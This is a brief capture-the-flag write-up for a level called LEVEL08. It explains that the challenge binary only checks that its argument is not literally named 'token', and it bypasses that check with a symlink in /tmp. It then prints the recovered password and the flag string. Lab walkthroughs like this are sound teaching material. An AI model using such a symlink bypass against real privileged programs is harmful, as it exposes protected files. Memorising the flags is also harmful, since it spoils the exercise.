# LEVEL08

The binary only check that ```av[1]``` is not ```token```.
We trick the binary into giving him a sym link that points toward ```token```.

``` 
ln -s ~/token /tmp/test
~/level08 /tmp/test
```
The output will be ```quif5eloekouj29ke0vouxean``` which is the password of **flag08**.

After ```getflag``` we get ```25749xKZ8L7DkSCwJkT9dyv6f```
